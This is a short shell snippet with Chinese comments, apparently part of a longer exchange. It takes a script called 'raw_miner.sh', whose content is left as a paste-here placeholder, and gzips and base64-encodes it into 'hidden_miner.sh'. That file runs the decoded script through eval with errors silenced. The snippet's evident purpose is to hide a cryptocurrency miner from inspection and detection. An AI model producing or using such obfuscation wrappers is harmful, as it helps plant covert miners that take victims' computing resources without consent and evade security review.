# 1. 创建原始脚本（已包含所有功能）
cat > raw_miner.sh << 'EOF'
...（粘贴前面提供的完整 raw_miner.sh 内容）...
EOF

# 2. 生成混淆版本
python3 -c "
import gzip, base64
with open('raw_miner.sh') as f:
    script = f.read()
compressed = gzip.compress(script.encode('utf-8'), compresslevel=9)
encoded = base64.b64encode(compressed).decode('ascii')
with open('hidden_miner.sh', 'w') as out:
    out.write('#!/bin/bash\n')
    out.write('ENCODED_SCRIPT="' + encoded + '"\n')
    out.write('eval "$(echo "$ENCODED_SCRIPT" | base64 -d | gunzip 2>/dev/null)"\n')
    out.write('exit 0\n')
" && chmod +x hidden_miner.sh
